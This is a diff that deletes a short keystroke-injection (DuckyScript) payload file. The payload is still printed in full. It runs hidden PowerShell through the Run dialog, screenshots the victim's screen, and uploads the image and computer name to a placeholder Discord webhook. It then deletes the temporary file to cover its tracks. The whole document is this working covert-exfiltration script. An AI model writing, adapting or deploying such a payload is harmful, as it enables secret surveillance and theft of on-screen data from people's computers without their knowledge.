@@ -1,9 +1,0 @@
-REM ============================================
-REM Screenshot Capture -> Discord Webhook
-REM ============================================
-
-DELAY 500
-GUI r
-DELAY 200
-STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0, 0, 0, 0, $b.Size); $b.Save($env:TEMP+'\screen.png'); $w='YOUR_DISCORD_WEBHOOK_URL'; $msg=@{username='Screen Capture'; content='Screenshot from '+$env:COMPUTERNAME}|ConvertTo-Json -Compress; Invoke-RestMethod $w -Method Post -ContentType 'application/json' -Body $msg; Invoke-RestMethod $w -Method Post -Form @{file=Get-Item ($env:TEMP+'\screen.png')}; Remove-Item $env:TEMP+'\screen.png' -Force"
-ENTER
